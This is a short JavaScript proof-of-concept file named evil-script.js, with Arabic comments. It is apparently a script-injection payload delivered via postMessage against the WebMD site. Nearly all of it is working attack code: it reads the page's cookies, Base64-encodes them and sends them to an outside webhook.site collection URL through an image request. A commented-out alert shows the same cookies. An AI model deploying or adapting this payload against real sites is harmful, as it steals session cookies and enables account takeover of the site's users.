// evil-script.js - PoC نظيف وبسيط
console.log("Evil script LOADED successfully via postMessage on WebMD!");
//alert("XSS PoC: Script injected! Cookies visible in console: " + document.cookie);
// تشفير الكوكيز بـ Base64 قبل إرسالها
var stolenData = btoa(document.cookie); 
new Image().src = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/log?data=" + encodeURIComponent(stolenData);
